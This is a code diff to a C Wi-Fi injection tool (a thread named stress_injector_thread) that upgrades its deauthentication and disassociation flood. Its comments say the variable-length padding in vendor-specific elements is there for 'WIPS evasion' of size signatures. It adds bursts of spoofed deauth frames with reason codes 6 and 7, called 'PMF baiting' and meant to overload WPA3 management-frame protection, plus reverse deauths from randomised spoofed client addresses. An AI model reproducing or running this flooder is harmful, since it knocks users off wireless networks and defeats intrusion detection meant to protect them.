@@ -741,13 +741,15 @@ static int mk_deauth(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   memcpy(b + o, &r, 2);
   o += 2;
 
-  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
-  /* Mimics Microsoft WMM/WME parameter to bypass static size signatures */
+  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
+  uint8_t pad_len = 7 + (seq % 16); /* Padding length varies between 7 and 22 bytes */
   b[o++] = 221;
-  b[o++] = 7;
+  b[o++] = pad_len;
   b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
   b[o++] = 0x02; /* OUI Type */
-  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+  for (int i = 0; i < pad_len - 4; i++) {
+      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+  }
 
   return o;
 }
@@ -761,12 +763,15 @@ static int mk_deauth_rev(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   memcpy(b + o, &r, 2);
   o += 2;
 
-  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
+  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
+  uint8_t pad_len = 7 + (seq % 16);
   b[o++] = 221;
-  b[o++] = 7;
+  b[o++] = pad_len;
   b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
   b[o++] = 0x02; /* OUI Type */
-  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+  for (int i = 0; i < pad_len - 4; i++) {
+      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+  }
 
   return o;
 }
@@ -780,12 +785,15 @@ static int mk_disassoc(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   memcpy(b + o, &r, 2);
   o += 2;
 
-  /* [UPGRADE] WIPS Evasion Padding (IE 221 - Vendor Specific) */
+  /* [UPGRADE] Variable Length WIPS Evasion Padding based on seq */
+  uint8_t pad_len = 7 + (seq % 16);
   b[o++] = 221;
-  b[o++] = 7;
+  b[o++] = pad_len;
   b[o++] = 0x00; b[o++] = 0x50; b[o++] = 0xf2; /* Microsoft OUI */
   b[o++] = 0x02; /* OUI Type */
-  b[o++] = 0x01; b[o++] = 0x01; b[o++] = 0x80; /* Dummy data */
+  for (int i = 0; i < pad_len - 4; i++) {
+      b[o++] = (uint8_t)(seq + i); /* Dynamic dummy data */
+  }
 
   return o;
 }
@@ -4007,12 +4015,6 @@ static void *stress_injector_thread(void *arg) {
 
   /* [FIX] Zero-Copy Packet Templating: Pre-build templates to avoid thousands
    * of mk_* calls per second */
-  uint8_t tpl_deauth[MAX_PKT_SIZE];
-  int tpl_deauth_len = 0;
-  if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
-    uint8_t dummy_bss[6] = {0};
-    tpl_deauth_len = mk_deauth(tpl_deauth, dummy_bss, BCAST, 7, 0);
-  }
 
   uint8_t tpl_auth[MAX_PKT_SIZE];
   int tpl_auth_len = 0;
@@ -4078,52 +4080,81 @@ static void *stress_injector_thread(void *arg) {
 
       /* Build and inject selected vectors on-the-fly */
       if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
-        /* [FIX 47] Broadcast deauth using Zero-Copy Template with correct
-         * offsets */
-        memcpy(tpl_deauth + OFF_A2, bss, 6); /* addr2 = SA (BSSID) */
-        memcpy(tpl_deauth + OFF_A3, bss, 6); /* addr3 = BSSID */
-        uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
-        memcpy(tpl_deauth + OFF_SEQ, &s_ctrl, 2);
+        /* [UPGRADE] Micro-Burst & PMF Baiting (WPA3 Evasion) */
+        /* Send a burst of 3 packets to overload the WPA3 PMF discard queue */
+        for (int burst = 0; burst < 3; burst++) {
+            /* 1. PMF Baiting: Reason 6 (Class 2 frame received) */
+            len = mk_deauth(tmp, bss, bss, 6, (seq++) & 0xFFF);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
 
-        if (inject_one(sock, tpl_deauth, tpl_deauth_len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
-        }
+            /* 2. PMF Baiting: Reason 7 (Class 3 frame received) */
+            len = mk_deauth(tmp, bss, bss, 7, (seq++) & 0xFFF);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
 
-        /* [UPGRADE] Forward unicast deauth directly to BSSID (some APs ignore broadcast) */
-        uint16_t reason = REASON_CODES[seq % N_REASONS];
-        len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
-        }
+            /* 3. Standard Rotated Reason (Unicast) */
+            uint16_t reason = REASON_CODES[seq % N_REASONS];
+            len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
 
-        /* Reverse deauth (client → AP spoof) with rotated reason */
-        uint8_t fake_cli[6];
-        rand_mac(fake_cli);
-        uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
-        len = mk_deauth_rev(tmp, bss, fake_cli, rev_reason, (seq++) & 0xFFF);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+            /* 4. Reverse Deauth (Client -> AP spoofing) */
+            uint8_t fake_cli[6];
+            rand_mac(fake_cli);
+            uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
+            len = mk_deauth_rev(tmp, bss, fake_cli, rev_reason, (seq++) & 0xFFF);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
         }
       }
 
       if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
-        /* [UPGRADE] Reason code rotation for disassoc */
-        uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
-        len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
-        if (inject_one(sock, tmp, len) > 0) {
-          atomic_fetch_add(&g_pkts_sent, 1);
-          sent_for_ap++;
-        } else {
-          atomic_fetch_add(&g_pkts_fail, 1);
+        /* [UPGRADE] Micro-Burst & PMF Baiting for Disassoc */
+        for (int burst = 0; burst < 3; burst++) {
+            /* 1. PMF Baiting: Reason 6 */
+            len = mk_disassoc(tmp, bss, BCAST, 6, seq++);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
+
+            /* 2. PMF Baiting: Reason 7 */
+            len = mk_disassoc(tmp, bss, BCAST, 7, seq++);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
+
+            /* 3. Standard Rotated Reason */
+            uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
+            len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
+            if (inject_one(sock, tmp, len) > 0) {
+              atomic_fetch_add(&g_pkts_sent, 1);
+              sent_for_ap++;
+            } else {
+              atomic_fetch_add(&g_pkts_fail, 1);
+            }
         }
       }
 
